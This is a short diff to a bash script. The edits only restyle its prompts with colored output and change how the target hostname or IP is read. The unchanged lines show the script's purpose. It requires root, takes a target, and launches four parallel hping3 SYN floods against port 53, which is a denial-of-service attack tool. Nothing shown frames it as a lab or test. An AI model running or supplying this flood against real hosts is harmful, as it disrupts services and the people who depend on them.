@@ -39,9 +39,10 @@ FILE="/tmp/out.$$"
 GREP="/bin/grep"
 #Only root should run this.
 if [[ $EUID -ne 0 ]]; then
-	echo "Run as root." 1>&2
+	echo -e "${WARNING}Run as root.${END}" 1>&2
 	exit 1
 fi
 
-read -r -p "Hostname/IP?" host
+echo -e "${ENTER_LINE}Hostname/IP?${END}"
+read host
 hping3 -S -p 53 $host --flood & hping3 -S -p 53 $host --flood & hping3 -S -p 53 $host --flood & hping3 -S -p 53 $host --flood & 
